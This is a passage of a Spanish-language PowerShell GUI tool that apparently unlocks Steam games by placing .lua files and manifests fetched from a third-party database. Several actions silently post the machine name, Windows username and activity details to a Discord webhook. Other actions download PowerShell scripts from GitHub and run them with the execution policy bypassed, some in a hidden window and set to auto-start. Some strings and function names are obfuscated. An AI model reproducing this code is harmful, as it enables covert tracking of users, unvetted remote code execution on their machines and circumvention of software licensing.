        $btnCancel.Text="Cancelar"; $btnCancel.Location=New-Object System.Drawing.Point(252,444); $btnCancel.Size=New-Object System.Drawing.Size(220,32)
        $btnCancel.BackColor=$script:CardBG; $btnCancel.ForeColor=$script:White; $btnCancel.FlatStyle="Flat"; $btnCancel.FlatAppearance.BorderSize=0; $btnCancel.Font=$script:FntCard; $btnCancel.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btnCancel.Add_Click({ $formDel.DialogResult=[System.Windows.Forms.DialogResult]::Cancel; $formDel.Close() })
        $btnOk.Add_Click({
            $sel=@($lvDel.CheckedItems)
            if ($sel.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("Selecciona al menos un juego.","Eliminar juego","OK","Warning"); return }
            if ([System.Windows.Forms.MessageBox]::Show("Se borraran $($sel.Count) juegos. Se hara backup en %LOCALAPPDATA%\BastissSteam\backup y se notificara a Discord.`n`nContinuar?","Eliminar juego","YesNo","Warning") -ne "Yes") { return }
            $selNames=@($sel | ForEach-Object { [string]$_.Text })
            $backupRoot=Join-Path $env:LOCALAPPDATA "BastissSteam\backup\manual_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$([guid]::NewGuid().ToString('N').Substring(0,6))"
            try { New-Item -ItemType Directory -Path $backupRoot -Force | Out-Null } catch {}
            $borrados=0
            $selLuas=@()
            foreach ($it2 in $sel) {
                $t=$it2.Tag.Timer; $root=$t.steam_root; if (-not $root) { try { $root=Get-SteamPath } catch {} }
                foreach ($lf in @($t.lua_files)) { $selLuas += [string]$lf }
                foreach ($f in @($t.lua_files)) {
                    $p1=Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f; $p2=Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
                    try { if (Test-Path -LiteralPath $p1) { Copy-Item -LiteralPath $p1 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                    try { if (Test-Path -LiteralPath $p2) { Copy-Item -LiteralPath $p2 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                    Remove-FileHard $p1; Remove-FileHard $p2
                }
                foreach ($f in @($t.manifest_files)) { $p3=Join-Path (Join-Path $root "config\depotcache") $f; try { if (Test-Path -LiteralPath $p3) { Copy-Item -LiteralPath $p3 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}; Remove-FileHard $p3 }
                $borrados++
            }
            try {
                $remain=@(At5Vc | Where-Object { $keep=$true; foreach ($lf in @($_.lua_files)) { if ($selLuas -contains [string]$lf) { $keep=$false; break } }; $keep })
                St7Xb $remain
                $script:activeCodes.Clear()
                foreach ($x in @(At5Vc)) { try { $script:activeCodes.Add(@{Code=$x.redeem_code;Game=$x.game_name;ActivatedAt=(Get-Date);ExpiresAt=($x.expires_at -as [datetime]);Duration=$x.duration;InternetCreatedAt=$x.internet_created_at}) | Out-Null } catch {} }
                $script:rp.Invalidate(); RfC
            } catch {}
            try { $content="**BORRADO MANUAL:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Juegos:** $($selNames -join ', ')`n**Backup:** $backupRoot`n**Borrados:** $borrados"; $payload=@{content=$content}|ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
            [System.Windows.Forms.MessageBox]::Show("Se borraron $borrados juegos. Backup en $backupRoot","Eliminar juego","OK","Information")
            $formDel.DialogResult=[System.Windows.Forms.DialogResult]::OK; $formDel.Close()
        })
        $formDel.Controls.Add($lvDel); $formDel.Controls.Add($btnOk); $formDel.Controls.Add($btnCancel)
        $formDel.ShowDialog() | Out-Null; $formDel.Dispose()
    } catch { WEL "Eliminar juego" $_; [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)","Eliminar juego","OK","Error") }
}
$script:sp.Controls.Add($script:sDelGame)


$script:sMigrar=New-CfgBtn ($sY+58) "Migrar" "Presioná para migrar" {
    if ([System.Windows.Forms.MessageBox]::Show("Listo, migrando...","Migrar","YesNo","Information") -ne "Yes") { return }
    [System.Windows.Forms.Application]::DoEvents()
    $errs=@()
    $patchOk=$false
    try { $patchOk=Xz9Qk -Silent } catch { $patchOk=$false; $errs+=("Parche: "+$_.Exception.Message) }
    $libs=@()
    try { $libs=@(Ss3Jd) } catch {}
    if (-not $libs -or $libs.Count -eq 0) { try { $libs=@(Get-SteamPath) } catch { $errs+=("Steam: "+$_.Exception.Message) } }
    $libs=$libs | Where-Object { $_ } | Sort-Object -Unique
    if ($libs.Count -eq 0) {
        try { $pl=@{content="**MIGRAR FALLO:** $env:COMPUTERNAME / $([Environment]::UserName)`nNo se encontro Steam.`n$($errs -join "`n")"}|ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
        [System.Windows.Forms.MessageBox]::Show("Algo salió mal, intentá de nuevo más tarde.","Migrar","OK","Warning"); return
    }
    $gtotal=0; $gok=0; $gcreadas=@(); $gdetalle=@()
    foreach ($srM in $libs) {
        $srcDir=Join-Path $srM "config\stplug-in"; $dstDir=Join-Path $srM "config\lua"
        $dstOk=$false
        if (Test-Path -LiteralPath $dstDir) { $dstOk=$true }
        else { try { New-Item -ItemType Directory -Path $dstDir -Force -ErrorAction Stop | Out-Null; $dstOk=Test-Path -LiteralPath $dstDir; if($dstOk){$gcreadas+=$dstDir} } catch { $errs+=("Crear ${dstDir}: "+$_.Exception.Message) } }
        if (-not $dstOk) { $gdetalle+=("${srM}: no se pudo crear lua"); continue }
        $luas=@()
        if (Test-Path -LiteralPath $srcDir) { try { $luas=@(Get-ChildItem -LiteralPath $srcDir -Filter *.lua -File -ErrorAction Stop) } catch { $errs+=("Leer ${srcDir}: "+$_.Exception.Message) } }
        else { $gdetalle+=("${srM}: sin stplug-in") }
        foreach ($l in $luas) {
            $gtotal++
            try { $dest=Join-Path $dstDir $l.Name; Copy-Item -LiteralPath $l.FullName -Destination $dest -Force -ErrorAction Stop; if ((Test-Path -LiteralPath $dest) -and ((Get-Item -LiteralPath $dest).Length -eq $l.Length)) { $gok++ } else { $errs+=("Verificar $($l.Name)") } } catch { $errs+=($l.Name+": "+$_.Exception.Message) }
        }
        $gdetalle+=("${srM}: $($luas.Count) luas")
    }
    $estado=if($patchOk){"INSTALADO"}else{"FALLO"}
    try {
        $bt=[char]96
        $content="**MIGRAR:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Parche:** $estado`n**Migrados:** $gok de $gtotal`n**Carpetas lua creadas:** $($gcreadas.Count)`n**Detalle:**`n$($gdetalle -join "`n")"
        if ($errs.Count -gt 0) { $errText=($errs | Select-Object -First 10) -join "`n"; $content+="`n**Errores:**`n$bt$bt$bt`n$errText`n$bt$bt$bt" }
        $pl=@{content=$content}|ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    if ($patchOk -and $errs.Count -eq 0 -and $gok -eq $gtotal) { [System.Windows.Forms.MessageBox]::Show("Listo, migrado correctamente.","Migrar","OK","Information") }
    else { [System.Windows.Forms.MessageBox]::Show("Algo salió mal, intentá de nuevo más tarde.","Migrar","OK","Warning") }
}
$script:sp.Controls.Add($script:sMigrar)


$script:sFixDl=New-CfgBtn ($sY+116) "Arreglar descarga" "Quita los manifests y arregla el error Sin conexión" {
    [System.Windows.Forms.Application]::DoEvents()
    $srTmp=$null; try { $srTmp=Get-SteamPath } catch {}
    if (-not $srTmp) { [System.Windows.Forms.MessageBox]::Show("Algo salió mal, intentá de nuevo más tarde.","Solucionar descarga","OK","Warning"); return }
    $dirs=@((Join-Path $srTmp "config\stplug-in"),(Join-Path $srTmp "config\lua"))
    $apps=@()
    foreach ($d in $dirs) { if (Test-Path -LiteralPath $d) { try { $apps+=@(Get-ChildItem -LiteralPath $d -Filter *.lua -ErrorAction SilentlyContinue | ForEach-Object { $_.BaseName }) } catch {} } }
    $apps=@($apps | Sort-Object -Unique)
    if ($apps.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("Algo salió mal, intentá de nuevo más tarde.","Solucionar descarga","OK","Warning"); return }
    if ([System.Windows.Forms.MessageBox]::Show("Se reinstalarán los manifests de $($apps.Count) juegos para que descarguen.`n`n¿Continuar?", "Arreglar descarga", "YesNo", "Information") -ne "Yes") { return }
    $progForm=New-Object System.Windows.Forms.Form; $progForm.Text="Arreglar descarga"; $progForm.Size=New-Object System.Drawing.Size(420,140); $progForm.StartPosition="CenterParent"; $progForm.FormBorderStyle="FixedDialog"; $progForm.MaximizeBox=$false; $progForm.MinimizeBox=$false; $progForm.BackColor=$BG; $progForm.TopMost=$true
    $progLbl=New-Object System.Windows.Forms.Label; $progLbl.Location=New-Object System.Drawing.Point(16,16); $progLbl.Size=New-Object System.Drawing.Size(380,20); $progLbl.ForeColor=$White; $progLbl.BackColor=$BG; $progLbl.Text="Iniciando..."; $progForm.Controls.Add($progLbl)
    $progBar=New-Object System.Windows.Forms.ProgressBar; $progBar.Location=New-Object System.Drawing.Point(16,44); $progBar.Size=New-Object System.Drawing.Size(380,22); $progBar.Minimum=0; $progBar.Maximum=$apps.Count; $progBar.Value=0; $progBar.Style="Continuous"; $progForm.Controls.Add($progBar)
    $progSub=New-Object System.Windows.Forms.Label; $progSub.Location=New-Object System.Drawing.Point(16,74); $progSub.Size=New-Object System.Drawing.Size(380,16); $progSub.ForeColor=$script:Gray; $progSub.Font=$script:FntSub; $progSub.BackColor=$BG; $progSub.Text="0 / $($apps.Count)"; $progForm.Controls.Add($progSub)
    $progForm.Show(); [System.Windows.Forms.Application]::DoEvents()
    $manDir=Join-Path $srTmp "config\depotcache"; $luaDir=Join-Path $srTmp "config\stplug-in"; $luaDir2=Join-Path $srTmp "config\lua"
    foreach ($d in @($manDir,$luaDir,$luaDir2)) { if (-not (Test-Path -LiteralPath $d)) { try { New-Item -ItemType Directory -Path $d -Force | Out-Null } catch {} } }
    $throttle=[Math]::Min(16,$apps.Count); [System.Net.ServicePointManager]::DefaultConnectionLimit=100
    $pool=[runspacefactory]::CreateRunspacePool(1,$throttle); $pool.Open()
    $sbBase="https://raw.githubusercontent.com/SPIN0ZAi/SB_manifest_DB"; $sbCdn="https://cdn.jsdelivr.net/gh/SPIN0ZAi/SB_manifest_DB"
    $jobs=@(); $okCount=0; $failCount=0; $fails=@()
    foreach ($appid in $apps) {
        $ps=[powershell]::Create(); $ps.RunspacePool=$pool
        [void]$ps.AddScript({
            param($appid,$sbBase,$sbCdn,$luaDir,$luaDir2,$manDir)
            $tmp=Join-Path $env:TEMP "sb_$appid`_$(Get-Random)"
            try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch { return @{ok=$false; appid=$appid} }
            $luaOk=$false; $manCount=0
            try {
                $wc=New-Object System.Net.WebClient; $txt=$null
                for ($r=0; $r -lt 2 -and -not $txt; $r++) {
                    try { $txt=$wc.DownloadString("$sbCdn@$appid/$appid.lua") } catch {}
                    if (-not $txt) { try { $txt=$wc.DownloadString("$sbBase/$appid/$appid.lua") } catch {} }
                    if (-not $txt) { Start-Sleep -Milliseconds 400 }
                }
                if ($txt -and $txt -match "addappid") { [IO.File]::WriteAllText((Join-Path $tmp "$appid.lua"), $txt); $luaOk=$true }
                $wc.Dispose()
                if ($luaOk) {
                    try { Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir "$appid.lua") -Force; Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir2 "$appid.lua") -Force } catch {}
                    $ids=@([regex]::Matches($txt,'setManifestid\((\d+),\s*"(\d+)"') | ForEach-Object { "$($_.Groups[1].Value)_$($_.Groups[2].Value).manifest" }) | Select-Object -Unique
                    foreach ($m in $ids) {
                        $destMan=Join-Path $manDir $m
                        if ((Test-Path -LiteralPath $destMan) -and ((Get-Item -LiteralPath $destMan).Length -gt 500)) { $manCount++; continue }
                        try { $wc2=New-Object System.Net.WebClient; $dst2=Join-Path $tmp $m; try { $wc2.DownloadFile("$sbCdn@$appid/$m",$dst2) } catch { $wc2.DownloadFile("$sbBase/$appid/$m",$dst2) }; $wc2.Dispose(); if ((Test-Path $dst2) -and ((Get-Item $dst2).Length -gt 100)) { Copy-Item -LiteralPath $dst2 -Destination $destMan -Force; $manCount++ } } catch {}
                    }
                    if ($ids.Count -eq 0) { $manCount=1 }
                }
            } catch {}
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
            return @{ok=$luaOk; appid=$appid; man=$manCount}
        }).AddArgument($appid).AddArgument($sbBase).AddArgument($sbCdn).AddArgument($luaDir).AddArgument($luaDir2).AddArgument($manDir)
        $h=$ps.BeginInvoke(); $jobs+=@{ps=$ps; handle=$h; appid=$appid}
    }
    while (@($jobs | Where-Object { -not $_.handle.IsCompleted }).Count -gt 0) {
        $cDone=@($jobs | Where-Object { $_.handle.IsCompleted }).Count
        $progLbl.Text="Reparando... $cDone/$($apps.Count)"; try { $progBar.Value=[Math]::Min($cDone,$apps.Count) } catch {}; $progSub.Text="$cDone / $($apps.Count)"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 150
    }
    foreach ($j in $jobs) {
        try { $r=$j.ps.EndInvoke($j.handle); if ($r -and $r.ok) { $okCount++ } else { $failCount++; if($fails.Count -lt 10){ $fails+=$j.appid } } } catch { $failCount++; if($fails.Count -lt 10){ $fails+=$j.appid } }
        try { $j.ps.Dispose() } catch {}
    }
    $pool.Close(); $pool.Dispose()
    $progBar.Value=$apps.Count; $progLbl.Text="Completado $okCount/$($apps.Count)"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 400
    $progForm.Close(); $progForm.Dispose()
    try { $content="**ARREGLAR DESCARGA (con manifests):** $env:COMPUTERNAME / $([Environment]::UserName)`n**Total:** $($apps.Count)`n**OK:** $okCount`n**Fallos:** $failCount`n$(if($fails.Count -gt 0){'**Ej fallos:** '+($fails -join ', ')}else{''})"; $pl=@{content=$content}|ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
    [System.Windows.Forms.MessageBox]::Show("Listo, descarga reparada.","Arreglar descarga","OK","Information")
}
$script:sp.Controls.Add($script:sFixDl)


$script:sLuaTools=New-CfgBtn ($sY+174) "Reparar juegos" "Arregla los juegos que no descargan (manifests)" {
    try {
        $baseLocalR=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocalR)){ $baseLocalR=Join-Path $env:USERPROFILE "AppData\Local" }
        $luatoolsPath=$null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $luatoolsPath=Join-Path $PSScriptRoot "repair_luatools.ps1" }
        if([string]::IsNullOrWhiteSpace($luatoolsPath) -or -not (Test-Path $luatoolsPath)){ $luatoolsPath=Join-Path $baseLocalR "BastissSteam\repair_luatools.ps1" }
        if (-not (Test-Path $luatoolsPath)) {
            try {
              $dirR=Split-Path $luatoolsPath; if([string]::IsNullOrWhiteSpace($dirR)){$dirR=$baseLocalR}
              New-Item -ItemType Directory -Path $dirR -Force | Out-Null
              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/repair_luatools.ps1" -OutFile $luatoolsPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
            } catch {}
        }
        if (-not (Test-Path $luatoolsPath)) { [System.Windows.Forms.MessageBox]::Show("No se pudo obtener repair_luatools.ps1 en $luatoolsPath. Revisa tu internet.","Reparar juegos","OK","Warning") | Out-Null; return }
        Start-Process powershell.exe -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$luatoolsPath) -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}
$script:sp.Controls.Add($script:sLuaTools)

$script:autoLuaWatcherProcess=$null
$script:autoLuaWatcherEnabled=$false
try { $v=Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoLuaWatcher -ErrorAction SilentlyContinue; if($v -ne $null){ $script:autoLuaWatcherEnabled=[bool][int]$v.AutoLuaWatcher } } catch {}
$script:sAutoLua=New-BufferedPanel
$script:sAutoLua.Location=New-Object System.Drawing.Point($PAD,($sY+116))
$script:sAutoLua.Size=New-Object System.Drawing.Size($CW,50);$script:sAutoLua.BackColor=$BG
$script:sAutoLua.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sAutoLua.Tag=@{Hover=$false}
$script:sAutoLua.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sAutoLua.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sAutoLua.Add_Paint({param($s,$e)
 $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
 $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
 $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
 $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
 $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
 $on=$script:autoLuaWatcherEnabled
 $st=if($on){"Reparar descargar 1: ACTIVADO"}else{"Reparar descargar 1: DESACTIVADO"}
 $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
 $sub=if($on){""}else{"Click para activar"}
 $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
 $clr=if($on){$script:Green}else{$script:Red}
 $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-24),16,10,10);$dot.Dispose()
})
$script:sAutoLua.Add_Click({
 $script:autoLuaWatcherEnabled=-not $script:autoLuaWatcherEnabled
 try { New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoLuaWatcher -Value ([int]$script:autoLuaWatcherEnabled) -Type DWord -Force } catch {}
 if($script:autoLuaWatcherEnabled){
  try{
   $baseLocal=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal)){ $baseLocal=Join-Path $env:USERPROFILE "AppData\Local" }
   $watcherPath=$null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_luatools.ps1" }
   if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal "BastissSteam\watcher_luatools.ps1" }
   if(-not (Test-Path $watcherPath)){
     try {
       $dir=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir)){$dir=$baseLocal}
       New-Item -ItemType Directory -Path $dir -Force | Out-Null
       Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_luatools.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
     } catch {}
   }
   if(-not (Test-Path $watcherPath)){ throw "No se pudo obtener watcher_luatools.ps1 en $watcherPath" }
   $psi=New-Object System.Diagnostics.ProcessStartInfo
   $psi.FileName="powershell.exe"
   $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
   $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
   $script:autoLuaWatcherProcess=[System.Diagnostics.Process]::Start($psi)
  }catch{
   $script:autoLuaWatcherEnabled=$false
   try { Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoLuaWatcher -Value 0 -Type DWord -Force } catch {}
   [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar Reparar descargar 1: $($_.Exception.Message)","Reparar descargar 1","OK","Error") | Out-Null
   $script:sAutoLua.Invalidate()
   return
  }
  [System.Windows.Forms.MessageBox]::Show("REPARAR DESCARGAR 1 FUNCIONANDO CORRECTAMENTE","Reparar descargar 1","OK","Information") | Out-Null
 } else {
  try{ if($script:autoLuaWatcherProcess -and -not $script:autoLuaWatcherProcess.HasExited){ $script:autoLuaWatcherProcess.Kill() } }catch{}
  try{ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match "watcher_luatools.ps1" } | ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force }catch{} } }catch{}
  $script:autoLuaWatcherProcess=$null
  [System.Windows.Forms.MessageBox]::Show("Reparar descargar 1 desactivado.","Reparar descargar 1","OK","Information") | Out-Null
 }
 $script:sAutoLua.Invalidate()
})
$script:sp.Controls.Add($script:sAutoLua)
# auto-start Reparar descargar 1 if enabled
if($script:autoLuaWatcherEnabled){
 try{
  $baseLocal2=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal2)){ $baseLocal2=Join-Path $env:USERPROFILE "AppData\Local" }
  $watcherPath= $null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_luatools.ps1" }
  if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal2 "BastissSteam\watcher_luatools.ps1" }
  if(-not (Test-Path $watcherPath)){
    try {
      $dir2=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir2)){$dir2=$baseLocal2}
      New-Item -ItemType Directory -Path $dir2 -Force | Out-Null
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_luatools.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
    } catch {}
  }
  if(Test-Path $watcherPath){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
    $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
    $script:autoLuaWatcherProcess=[System.Diagnostics.Process]::Start($psi)
  }
 }catch{}
}
$script:autoDropsV2Process=$null
$script:autoDropsV2Enabled=$false
try { $v=Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoDropsV2 -ErrorAction SilentlyContinue; if($v -ne $null){ $script:autoDropsV2Enabled=[bool][int]$v.AutoDropsV2 } } catch {}
$script:sDropsV2=New-BufferedPanel
$script:sDropsV2.Location=New-Object System.Drawing.Point($PAD,($sY+174))
$script:sDropsV2.Size=New-Object System.Drawing.Size($CW,50);$script:sDropsV2.BackColor=$BG
$script:sDropsV2.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sDropsV2.Tag=@{Hover=$false}
$script:sDropsV2.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sDropsV2.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sDropsV2.Add_Paint({param($s,$e)
 $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
 $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
 $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
 $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
 $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
 $on=$script:autoDropsV2Enabled
 $st=if($on){"Reparar descargar 2: ACTIVADO"}else{"Reparar descargar 2: DESACTIVADO"}
 $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
 $sub=if($on){""}else{"Click para activar"}
 $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
 $clr=if($on){$script:Green}else{$script:Red}
 $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-24),16,10,10);$dot.Dispose()
})
$script:sDropsV2.Add_Click({
 $script:autoDropsV2Enabled=-not $script:autoDropsV2Enabled
 try { New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoDropsV2 -Value ([int]$script:autoDropsV2Enabled) -Type DWord -Force } catch {}
 if($script:autoDropsV2Enabled){
  try{
   $baseLocal=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal)){ $baseLocal=Join-Path $env:USERPROFILE "AppData\Local" }
   $watcherPath=$null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_dropsv2.ps1" }
   if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal "BastissSteam\watcher_dropsv2.ps1" }
   if(-not (Test-Path $watcherPath)){
     try {
       $dir=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir)){$dir=$baseLocal}
       New-Item -ItemType Directory -Path $dir -Force | Out-Null
       Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_dropsv2.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
     } catch {}
   }
   if(-not (Test-Path $watcherPath)){ throw "No se pudo obtener watcher_dropsv2.ps1 en $watcherPath" }
   $psi=New-Object System.Diagnostics.ProcessStartInfo
   $psi.FileName="powershell.exe"
   $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
   $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
   $script:autoDropsV2Process=[System.Diagnostics.Process]::Start($psi)
  }catch{
   $script:autoDropsV2Enabled=$false
   try { Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoDropsV2 -Value 0 -Type DWord -Force } catch {}
   [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar Reparar descargar 2: $($_.Exception.Message)","Reparar descargar 2","OK","Error") | Out-Null
   $script:sDropsV2.Invalidate()
   return
  }
  [System.Windows.Forms.MessageBox]::Show("REPARAR DESCARGAR 2 FUNCIONANDO CORRECTAMENTE","Reparar descargar 2","OK","Information") | Out-Null
 } else {
  try{ if($script:autoDropsV2Process -and -not $script:autoDropsV2Process.HasExited){ $script:autoDropsV2Process.Kill() } }catch{}
  try{ Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match "watcher_dropsv2.ps1" } | ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force }catch{} } }catch{}
  $script:autoDropsV2Process=$null
  [System.Windows.Forms.MessageBox]::Show("Reparar descargar 2 desactivado.","Reparar descargar 2","OK","Information") | Out-Null
 }
 $script:sDropsV2.Invalidate()
})
$script:sp.Controls.Add($script:sDropsV2)
# auto-start Reparar descargar 2 if enabled
if($script:autoDropsV2Enabled){
 try{
  $baseLocal2=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocal2)){ $baseLocal2=Join-Path $env:USERPROFILE "AppData\Local" }
  $watcherPath= $null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $watcherPath=Join-Path $PSScriptRoot "watcher_dropsv2.ps1" }
  if([string]::IsNullOrWhiteSpace($watcherPath) -or -not (Test-Path $watcherPath)){ $watcherPath=Join-Path $baseLocal2 "BastissSteam\watcher_dropsv2.ps1" }
  if(-not (Test-Path $watcherPath)){
    try {
      $dir2=Split-Path $watcherPath; if([string]::IsNullOrWhiteSpace($dir2)){$dir2=$baseLocal2}
      New-Item -ItemType Directory -Path $dir2 -Force | Out-Null
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/watcher_dropsv2.ps1" -OutFile $watcherPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
    } catch {}
  }
  if(Test-Path $watcherPath){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watcherPath`""
    $psi.WindowStyle="Hidden";$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false
    $script:autoDropsV2Process=[System.Diagnostics.Process]::Start($psi)
  }
 }catch{}
}


function Mn3Vp {
    try {
        $fixes = Qw7Rt
        if (-not $fixes -or $fixes.Count -eq 0) {
            [System.Windows.Forms.MessageBox]::Show((S("Tm8gc2UgcHVkbyBvYnRlbmVyIGxhIGxpc3RhIGRlIHJlcGFyYWNpb25lcy4gUmV2aXNhIHR1IGNvbmV4aW9uLg==")),(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")),"OK","Warning")
            return
        }
        $games = Ii5Hb
        $noGameFolders = @('Steamworks Shared','Steam Controller Configs')
        $timers = At5Vc
        $libs = Ss3Jd
        $diskLuas = @{}
        foreach ($lib in $libs) {
            foreach ($sub in @('config\stplug-in','config\lua')) {
                $d = Join-Path $lib $sub
                if (Test-Path $d) { Get-ChildItem "$d\*.lua" -ErrorAction SilentlyContinue | ForEach-Object { $diskLuas[$_.Name] = $true } }
            }
        }
        $rows = @()
        foreach ($name in $games.Keys) {
            if ($noGameFolders -contains $name) { continue }
